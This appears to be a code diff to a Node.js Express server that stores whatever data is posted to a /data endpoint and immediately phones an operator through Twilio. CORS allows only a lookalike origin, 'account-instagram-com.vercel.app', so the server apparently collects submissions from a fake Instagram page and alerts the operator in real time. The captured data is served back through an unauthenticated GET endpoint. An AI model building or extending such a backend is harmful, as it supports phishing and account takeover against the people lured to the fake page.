@@ -6,6 +6,10 @@ const twilio = require("twilio");
 
 const app = express();
 
+// --------------------------------------------------
+// Middleware
+// --------------------------------------------------
+
 app.use(cors({
     origin: [
         "https://account-instagram-com.vercel.app",
@@ -24,20 +28,20 @@ const {
     TWILIO_ACCOUNT_SID,
     TWILIO_AUTH_TOKEN,
     TWILIO_FROM_NUMBER,
-    ALERT_TO_1,
-    ALERT_TO_2,
-    ALERT_TO_3
+    ALERT_TO
 } = process.env;
 
 if (
     !TWILIO_ACCOUNT_SID ||
     !TWILIO_AUTH_TOKEN ||
     !TWILIO_FROM_NUMBER ||
-    !ALERT_TO_1 ||
-    !ALERT_TO_2 ||
-    !ALERT_TO_3
+    !ALERT_TO
 ) {
-    throw new Error("Missing required environment variables");
+    throw new Error(
+        "Missing required environment variables: " +
+        "TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN, " +
+        "TWILIO_FROM_NUMBER, ALERT_TO"
+    );
 }
 
 // --------------------------------------------------
@@ -50,32 +54,22 @@ const twilioClient = twilio(
 );
 
 // --------------------------------------------------
+// Application data
+// --------------------------------------------------
+
+let currentData = null;
+
+// --------------------------------------------------
 // Alert state
 // --------------------------------------------------
 
 let alertState = {
     active: false,
     startedAt: null,
-
-    people: {
-        person1: {
-            number: ALERT_TO_1,
-            status: "idle",
-            callSid: null
-        },
-
-        person2: {
-            number: ALERT_TO_2,
-            status: "idle",
-            callSid: null
-        },
-
-        person3: {
-            number: ALERT_TO_3,
-            status: "idle",
-            callSid: null
-        }
-    }
+    number: ALERT_TO,
+    status: "idle",
+    callSid: null,
+    error: null
 };
 
 // --------------------------------------------------
@@ -90,110 +84,165 @@ app.get("/health", (req, res) => {
 });
 
 // --------------------------------------------------
-// Start 3 calls
+// GET /data
+// --------------------------------------------------
+// This fixes "Cannot GET /data"
 // --------------------------------------------------
 
-app.post("/alert", async (req, res) => {
+app.get("/data", (req, res) => {
 
+    res.json(
+        currentData
+            ? [currentData]
+            : []
+    );
+
+});
+
+// --------------------------------------------------
+// POST /data
+// --------------------------------------------------
+// Receiving NEW data automatically starts the call
+// --------------------------------------------------
+
+app.post("/data", async (req, res) => {
+
+    currentData = {
+        ...req.body,
+        receivedAt: new Date().toISOString()
+    };
+
+    console.log("New application data received.");
+
+    // Start alert automatically
+    const result = await startAlert();
+
+    res.json({
+        success: true,
+        message: "Data received",
+        alert: result
+    });
+
+});
+
+// --------------------------------------------------
+// Start alert
+// --------------------------------------------------
+
+async function startAlert() {
+
+    // Don't make another call if one is already active
     if (alertState.active) {
-        return res.status(409).json({
-            success: false,
+
+        console.log(
+            "Alert already active. No new call started."
+        );
+
+        return {
+            started: false,
             message: "An alert is already active."
-        });
+        };
     }
 
     alertState = {
         active: true,
         startedAt: new Date().toISOString(),
-
-        people: {
-            person1: {
-                number: ALERT_TO_1,
-                status: "calling",
-                callSid: null
-            },
-
-            person2: {
-                number: ALERT_TO_2,
-                status: "calling",
-                callSid: null
-            },
-
-            person3: {
-                number: ALERT_TO_3,
-                status: "calling",
-                callSid: null
-            }
-        }
+        number: ALERT_TO,
+        status: "calling",
+        callSid: null,
+        error: null
     };
 
-    const people = [
-        ["person1", ALERT_TO_1],
-        ["person2", ALERT_TO_2],
-        ["person3", ALERT_TO_3]
-    ];
+    try {
 
-    // Run the same Twilio call request for all 3 numbers
-    const calls = people.map(async ([person, number]) => {
+        console.log(
+            `Starting call to ${ALERT_TO}`
+        );
 
-        try {
+        const call = await twilioClient.calls.create({
 
-            console.log(
-                `${person}: starting call to ${number}`
-            );
+            to: ALERT_TO,
 
-            const call = await twilioClient.calls.create({
-                to: number,
+            from: TWILIO_FROM_NUMBER,
 
-                from: TWILIO_FROM_NUMBER,
+            // Same URL as your working curl command
+            url: "https://webhooks.twilio.com/v1/Voice/Template/voice_keyboard_input"
+        });
 
-                url: "https://webhooks.twilio.com/v1/Voice/Template/voice_keyboard_input"
-            });
+        alertState.callSid = call.sid;
+        alertState.status = "calling";
 
-            alertState.people[person].status = "calling";
-            alertState.people[person].callSid = call.sid;
+        console.log(
+            `Call started: ${call.sid}`
+        );
 
-            console.log(
-                `${person}: call started`
-            );
+        return {
+            started: true,
+            callSid: call.sid
+        };
 
-            console.log(
-                `${person}: ${call.sid}`
-            );
+    } catch (error) {
 
-        } catch (error) {
+        alertState.status = "call_failed";
+        alertState.error = error.message;
 
-            alertState.people[person].status = "call_failed";
+        console.error(
+            "Call failed:",
+            error.message
+        );
 
+        if (error.code) {
             console.error(
-                `${person}: call failed`
-            );
-
-            console.error(
-                error.message
+                "Twilio error code:",
+                error.code
             );
         }
-    });
 
-    await Promise.all(calls);
+        return {
+            started: false,
+            error: error.message,
+            code: error.code || null
+        };
+    }
+}
+
+// --------------------------------------------------
+// Manual alert
+// --------------------------------------------------
+
+app.post("/alert", async (req, res) => {
+
+    const result = await startAlert();
+
+    if (!result.started && alertState.active) {
+
+        return res.status(409).json({
+            success: false,
+            ...result,
+            status: alertState
+        });
+    }
 
     res.json({
-        success: true,
-        message: "All calls processed",
+        success: result.started,
+        ...result,
         status: alertState
     });
+
 });
 
 // --------------------------------------------------
-// Status
+// Alert status
 // --------------------------------------------------
 
 app.get("/alert/status", (req, res) => {
+
     res.json(alertState);
+
 });
 
 // --------------------------------------------------
-// Reset
+// Reset alert
 // --------------------------------------------------
 
 app.post("/alert/reset", (req, res) => {
@@ -201,32 +250,20 @@ app.post("/alert/reset", (req, res) => {
     alertState = {
         active: false,
         startedAt: null,
-
-        people: {
-            person1: {
-                number: ALERT_TO_1,
-                status: "idle",
-                callSid: null
-            },
-
-            person2: {
-                number: ALERT_TO_2,
-                status: "idle",
-                callSid: null
-            },
-
-            person3: {
-                number: ALERT_TO_3,
-                status: "idle",
-                callSid: null
-            }
-        }
+        number: ALERT_TO,
+        status: "idle",
+        callSid: null,
+        error: null
     };
+
+    console.log("Alert state reset.");
 
     res.json({
         success: true,
-        message: "Alert state reset"
+        message: "Alert state reset",
+        status: alertState
     });
+
 });
 
 // --------------------------------------------------
@@ -236,5 +273,9 @@ app.post("/alert/reset", (req, res) => {
 const PORT = process.env.PORT || 1000;
 
 app.listen(PORT, "0.0.0.0", () => {
-    console.log(`Server running on port ${PORT}`);
+
+    console.log(
+        `Server running on port ${PORT}`
+    );
+
 });
